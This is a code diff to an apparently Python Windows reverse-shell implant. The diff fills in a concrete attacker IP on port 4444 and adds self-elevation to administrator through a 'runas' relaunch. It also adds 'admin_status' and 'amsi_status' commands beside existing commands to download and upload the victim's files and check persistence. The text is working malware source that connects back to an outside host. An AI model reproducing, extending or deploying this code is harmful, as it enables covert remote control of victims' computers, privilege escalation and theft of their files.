@@ -4,10 +4,30 @@ import os
 import time
 import threading
 import winreg
+import ctypes
+import sys
 
-ATTACKER_IP = "ATTACKER_IP"  # Change to your attacker's IP
+ATTACKER_IP = "172.29.173.157"  # Change to your attacker's IP
 PORT = 4444  # Reverse shell port
 HTTP_PORT = 8080  # File transfer HTTP server port
+
+
+
+def is_admin():
+    """Check if the script is running with admin privileges."""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
+
+def elevate_to_admin():
+    """Elevate the script to run as an administrator."""
+    if not is_admin():
+        script = sys.argv[0]
+        params = " ".join(sys.argv[1:])
+        # Relaunch the script with admin privileges
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
+        sys.exit()
 
 
 
@@ -84,6 +104,8 @@ def connect_back():
 [+] Available Commands:
   - help                  : Show this help menu
   - persistence_status    : Check if persistence was added
+  - admin_status         : Check if running with admin privileges
+  - amsi_status           : Check if AMSI Bypass was successful
   - download <file>       : Download a file from victim machine
   - upload <file>         : Upload a file to victim machine
   - exit                  : Close the reverse shell
@@ -91,7 +113,13 @@ def connect_back():
 """
                     client.send(help_message.encode())
 
-                    
+                
+
+                elif cmd.lower() == "admin_status":
+                    if is_admin():
+                        client.send("[+] Running with admin privileges.\n".encode())
+                    else:
+                        client.send("[-] Not Running with admin privileges.\n".encode())
                 elif cmd.lower() == "persistence_status":
                     client.send(persistence_message.encode())
                 
@@ -120,6 +148,12 @@ def connect_back():
             time.sleep(5)  # Avoid excessive reconnection attempts
 
 if __name__ == "__main__":
-         
-    connect_back()
+    
+    elevate_to_admin()
+
+    
+    
+
+    connect_back()     
+    
      
